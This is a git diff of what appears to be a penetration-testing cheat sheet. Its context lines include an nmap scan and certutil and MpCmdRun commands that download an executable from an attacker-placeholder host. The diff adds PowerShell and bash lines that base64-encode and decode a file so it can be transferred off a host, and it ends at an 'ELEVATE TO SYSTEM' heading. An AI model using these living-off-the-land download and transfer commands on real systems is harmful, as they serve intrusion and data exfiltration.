@@ -11,10 +11,17 @@ nmap -sS -T4 -A -sC -oA scanme --stylesheet nmap-bootstrap.xsl scanme.nmap.org s
 xsltproc -o scanme.html nmap-bootstrap.xsl scanme.xml
 ```
 
-WINDOWS FILE DOWNLOAD
+WINDOWS FILE TRANSFER
 ```
 certutil.exe -urlcache -f "http://attackerIP/file.exe" file.exe
 MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file]
+
+
+$file-contents = Get-Content "filename.txt"
+$file-encode = [System.Text.Encoding]::UTF8.GetBytes($file-contents)
+[System.Convert]::ToBase64String($file-encode)
+
+echo -n <base64String> | base64 -d > filename.txt
 ```
 
 ELEVATE TO SYSTEM
